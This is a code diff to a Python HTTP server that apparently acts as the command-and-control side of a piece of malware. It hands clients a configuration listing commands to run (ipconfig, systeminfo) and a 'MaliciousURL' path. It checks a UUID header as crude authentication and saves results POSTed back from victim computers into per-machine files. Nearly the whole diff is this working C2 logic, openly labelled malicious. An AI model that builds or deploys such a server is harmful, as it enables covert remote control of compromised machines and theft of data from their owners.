@@ -9,7 +9,9 @@ hostPort = 0 #443
 UUID = ''
 MaliciousPath = ''
 Commands=[]
-Configuration = "{'Server': 'localhost', 'Commands':['ipconfig','systeminfo'],'MaliciousURL': 'httpL//localhost/malicious'}"
+Configuration = ""
+
+scriptDir = os.getcwd()
 
 def ConfigurationServer():
     with open('configuration.json') as f:
@@ -27,50 +29,41 @@ def ConfigurationServer():
         MaliciousPath = confFileJson['MaliciousPath']
         Commands = confFileJson['Commands']
 
-        Configuration = {"Server": hostName, "Commands":Commands,"MaliciousURL": hostName+MaliciousPath}
-        print(Commands)
-        print(Configuration)
+        #This is the configuration for the client side
+        Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousURL': hostName+MaliciousPath}
 
 class MyServer(BaseHTTPRequestHandler):
+    #GET Requests
     def do_GET(self):
+        #Checks if the UUID is match (Kind of authentication)
         if (self.headers.get('UUID') == UUID):
-            #print('UUID is good')
+            #Client asked for configuration
             if self.path.endswith("/Configuration"):
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
-                print((Configuration))
-                #with open('configuration.json') as data_file:
-                #    data = json.load(data_file)
-                self.wfile.write(Configuration.encode())
-                #print(Configuration)
-                print('Got Configuration request')
-                #print('Returned:'+json.loads(Configuration))
-                #self.wfile.write(json.dumps(Configuration))
-
-                #self.wfile.write(output.encode(encoding='utf_8'))
-                #print (output)
+                self.wfile.write(json.dumps(Configuration).encode())
+                #print(json.dumps(Configuration).encode())
                 return
-    def do_POST(self):
-        if (self.headers.get('UUID') == UUID):
-            if self.path.endswith("/Commands"):
-                print('Got POST Command')
-                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
 
+    #POST Requests
+    def do_POST(self):
+        #Checks if the UUID is match (Kind of authentication)
+        if (self.headers.get('UUID') == UUID):
+            #Client send a new data about command
+            if self.path.endswith("/Commands"):
+                #print('Got POST Command')
+                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                 self.send_response(200)
                 self.end_headers()
-
                 data = json.loads(self.data_string)
-                print(data)
-                with open("commandResults.json", "a+") as outfile:
-                    json.dump(data, outfile)
-                #print (data)
-                #file = open("commands.txt","a+")
+                print('New Data recieved from '+data['computer'])
+                with open(os.path.join(scriptDir+ "\CommandsData\\"+data['computer']+".dat"), "ab+") as outfile:
+                    outfile.write((data['computer']+','+data['type']+','+data['data']).encode())
                 self.wfile.write(("Done").encode())
                 return
 
 ConfigurationServer()
-print(hostName)
 myServer = HTTPServer((hostName, hostPort), MyServer)
 print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))
 
